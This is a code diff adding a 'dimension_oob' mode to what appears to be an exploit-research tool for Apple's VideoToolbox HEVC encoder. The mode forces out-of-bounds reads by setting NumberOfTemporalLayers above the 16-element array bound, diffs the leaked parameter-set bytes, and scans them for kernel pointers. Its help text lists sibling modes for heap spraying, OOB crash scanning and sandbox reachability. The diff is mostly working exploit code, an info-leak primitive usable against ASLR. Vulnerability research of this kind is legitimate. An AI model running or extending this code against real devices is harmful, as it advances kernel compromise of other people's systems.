@@ -7551,6 +7551,172 @@ vps_cd_done:
 
         rlog("\n=== HEAP_FENG_SHUI complete ===\n");
 
+    } else if (strcmp(mode, "dimension_oob") == 0) {
+        /*
+         * dimension_oob — Info leak via NumberOfTemporalLayers OOB
+         *
+         * dimension_id[64][16] stores per-layer dimension IDs.
+         * NumberOfTemporalLayers controls the temporal dimension count.
+         * If TL > 15, PSGen reads dimension_id[layer][TL] past the
+         * 16-element bound, pulling adjacent struct data into VPS output.
+         *
+         * Combined with low AID (in-bounds), this keeps VPS generation
+         * active while dimension reads go OOB.
+         */
+        int max_tl = (argc > 2) ? atoi(argv[2]) : 32;
+        int aid = (argc > 3) ? atoi(argv[3]) : 1;
+        if (max_tl < 1) max_tl = 1;
+        if (max_tl > 255) max_tl = 255;
+        if (aid < 0) aid = 0;
+        if (aid > 62) aid = 62;
+
+        int vw = 192, vh = 192;
+        rlog("=== DIMENSION_OOB: Info leak via NumberOfTemporalLayers ===\n");
+        rlog("TL range: 1-%d, AID=%d, res=%dx%d\n\n", max_tl, aid, vw, vh);
+
+        /* Get baseline VPS at TL=1 */
+        uint8_t baseline[512];
+        size_t blen = 0;
+        {
+            VTCompressionSessionRef s = NULL;
+            CFMutableDictionaryRef es = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+            CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+            OSStatus cs = VTCompressionSessionCreate(NULL, vw, vh,
+                kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &s);
+            CFRelease(es);
+            if (cs == noErr && s) {
+                VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+                VTSessionSetProperty(s, CFSTR("EncodesAlpha"), kCFBooleanTrue);
+                int av = aid;
+                CFNumberRef an = CFNumberCreate(NULL, kCFNumberIntType, &av);
+                VTSessionSetProperty(s, CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), an);
+                CFRelease(an);
+                int tl = 1;
+                CFNumberRef tn = CFNumberCreate(NULL, kCFNumberIntType, &tl);
+                VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), tn);
+                CFRelease(tn);
+                VTCompressionSessionPrepareToEncodeFrames(s);
+
+                g_encode_done = 0; g_cb_status = -999; g_cb_had_fmt = 0;
+                if (g_saved_fmt) { CFRelease(g_saved_fmt); g_saved_fmt = NULL; }
+                CVPixelBufferRef pb = create_pb(vw, vh);
+                if (pb) {
+                    VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(0,30), kCMTimeInvalid, NULL, NULL, NULL);
+                    VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
+                    for (int w = 0; w < 300 && !g_encode_done; w++) usleep(10000);
+                    CVPixelBufferRelease(pb);
+                }
+                if (g_saved_fmt) {
+                    const uint8_t *p = NULL; size_t sz = 0;
+                    CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(g_saved_fmt, 0, &p, &sz, NULL, NULL);
+                    if (p && sz > 0 && sz <= 512) { memcpy(baseline, p, sz); blen = sz; }
+                    CFRelease(g_saved_fmt); g_saved_fmt = NULL;
+                }
+                VTCompressionSessionInvalidate(s); CFRelease(s);
+            }
+        }
+        rlog("Baseline (TL=1): %zu bytes\n", blen);
+        if (blen > 0) {
+            rlog("  ");
+            for (size_t j = 0; j < blen && j < 64; j++) rlog("%02x", baseline[j]);
+            rlog("\n");
+        }
+        rlog("\n");
+
+        /* Scan TL=1..max_tl */
+        for (int tl = 1; tl <= max_tl; tl++) {
+            VTCompressionSessionRef s = NULL;
+            CFMutableDictionaryRef es = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+            CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+            OSStatus cs = VTCompressionSessionCreate(NULL, vw, vh,
+                kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &s);
+            CFRelease(es);
+            if (cs != noErr || !s) {
+                rlog("TL=%3d: create FAIL\n", tl);
+                continue;
+            }
+
+            VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+            VTSessionSetProperty(s, CFSTR("EncodesAlpha"), kCFBooleanTrue);
+            int av = aid;
+            CFNumberRef an = CFNumberCreate(NULL, kCFNumberIntType, &av);
+            VTSessionSetProperty(s, CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), an);
+            CFRelease(an);
+            CFNumberRef tn = CFNumberCreate(NULL, kCFNumberIntType, &tl);
+            VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), tn);
+            CFRelease(tn);
+
+            OSStatus ps = VTCompressionSessionPrepareToEncodeFrames(s);
+
+            g_encode_done = 0; g_cb_status = -999; g_cb_had_fmt = 0;
+            if (g_saved_fmt) { CFRelease(g_saved_fmt); g_saved_fmt = NULL; }
+
+            CVPixelBufferRef pb = create_pb(vw, vh);
+            if (pb) {
+                VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(tl, 30), kCMTimeInvalid, NULL, NULL, NULL);
+                VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
+                for (int w = 0; w < 300 && !g_encode_done; w++) usleep(10000);
+                CVPixelBufferRelease(pb);
+            }
+
+            size_t vlen = 0;
+            uint8_t vps[512];
+            int has_fmt = 0;
+            if (g_saved_fmt) {
+                has_fmt = 1;
+                const uint8_t *p = NULL; size_t sz = 0;
+                CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(g_saved_fmt, 0, &p, &sz, NULL, NULL);
+                if (p && sz > 0 && sz <= 512) { memcpy(vps, p, sz); vlen = sz; }
+                CFRelease(g_saved_fmt); g_saved_fmt = NULL;
+            }
+
+            int diffs = 0;
+            if (vlen > 0 && blen > 0) {
+                if (vlen != blen) diffs = -1;
+                else for (size_t j = 0; j < vlen; j++)
+                    if (vps[j] != baseline[j]) diffs++;
+            }
+
+            rlog("TL=%3d: prep=%d enc=%d fmt=%d vps=%zu",
+                 tl, (int)ps, (int)g_cb_status, has_fmt, vlen);
+            if (diffs == -1)
+                rlog(" *** LEN CHANGED %zu->%zu ***", blen, vlen);
+            else if (diffs > 0)
+                rlog(" *** %d BYTE DIFFS ***", diffs);
+            rlog("\n");
+
+            if (diffs != 0 && vlen > 0) {
+                rlog("  bytes: ");
+                for (size_t j = 0; j < vlen && j < 80; j++) rlog("%02x", vps[j]);
+                rlog("\n");
+                if (diffs > 0) {
+                    rlog("  diffs: ");
+                    size_t cl = (vlen < blen) ? vlen : blen;
+                    for (size_t j = 0; j < cl; j++)
+                        if (vps[j] != baseline[j])
+                            rlog("[%zu]%02x>%02x ", j, baseline[j], vps[j]);
+                    rlog("\n");
+                }
+                /* Scan for kernel pointers */
+                if (vlen >= 8) {
+                    for (size_t j = 0; j <= vlen - 8; j += 4) {
+                        uint64_t qw; memcpy(&qw, vps + j, 8);
+                        if ((qw >> 40) == 0xfffffe || (qw >> 40) == 0xffff80)
+                            rlog("  *** KPTR@%zu: 0x%016llx ***\n", j, (unsigned long long)qw);
+                    }
+                }
+            }
+
+            VTCompressionSessionInvalidate(s); CFRelease(s);
+            usleep(30000);
+        }
+
+        rlog("\n=== DIMENSION_OOB complete ===\n");
+
     } else if (strcmp(mode, "vps_byte_dump") == 0) {
         /*
          * vps_byte_dump — Dump raw VPS NAL bytes at varying AlphaLayerID values
@@ -7804,6 +7970,7 @@ vps_cd_done:
         rlog("  iosurface_probe    -- KEY: IOSurface sandbox access + CVE-112477 reachability\n");
         rlog("  oob_crash_scan [start] [end] [muxa] -- Scan OOB indices for crash/critical fields\n");
         rlog("  heap_feng_shui [n] [aid] -- KEY: Cross-session VPS corruption via OOB (heap spray)\n");
+        rlog("  dimension_oob [max_tl] [aid] -- KEY: Info leak via NumberOfTemporalLayers OOB\n");
         rlog("  vps_byte_dump [max_aid] -- KEY: Dump VPS bytes at OOB AlphaLayerID (info leak)\n");
         rlog("  diag3          -- Multi-image stereo encode (CMTaggedBufferGroup)\n");
         rlog("\nKey entry thresholds (TABLE 1):\n");
